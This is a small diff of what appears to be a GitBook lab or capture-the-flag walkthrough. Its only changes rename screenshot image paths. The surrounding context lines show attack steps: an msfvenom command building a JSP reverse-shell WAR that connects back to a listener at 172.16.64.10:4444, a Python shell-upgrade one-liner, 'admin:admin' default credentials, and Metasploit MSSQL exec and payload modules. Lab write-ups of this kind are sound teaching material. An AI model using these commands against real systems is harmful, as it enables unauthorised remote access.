@@ -243,13 +243,13 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=4444 -f war -o r
 
 ![](<../../../.gitbook/assets/image (30) (1) (1) (1).png>)
 
-![](<../../../.gitbook/assets/image (13).png>)
+![](<../../../.gitbook/assets/image (13) (2).png>)
 
 ![](<../../../.gitbook/assets/image (61) (1) (1).png>)
 
 ![](<../../../.gitbook/assets/image (64) (1) (1) (1).png>)
 
-![](<../../../.gitbook/assets/image (14).png>)
+![](<../../../.gitbook/assets/image (14) (1).png>)
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -296,7 +296,7 @@ admin:admin
 
 ![](<../../../.gitbook/assets/image (67) (1) (1).png>)
 
-![](<../../../.gitbook/assets/image (9) (1).png>)
+![](<../../../.gitbook/assets/image (9) (1) (2).png>)
 
 ![](<../../../.gitbook/assets/image (60).png>)
 
@@ -335,7 +335,7 @@ use auxiliary/admin/mssql/mssql_exec
 use windows/mssql/mssql_payload
 ```
 
-![](<../../../.gitbook/assets/image (4) (1).png>)
+![](<../../../.gitbook/assets/image (4) (1) (1).png>)
 
 ![](<../../../.gitbook/assets/image (63) (1) (1).png>)
 
@@ -361,7 +361,7 @@ ssh developer@172.16.64.182
 
 ![](<../../../.gitbook/assets/image (62) (1).png>)
 
-![](<../../../.gitbook/assets/image (18) (1) (1).png>)
+![](<../../../.gitbook/assets/image (18) (1) (1) (2).png>)
 
 ### Flag
 
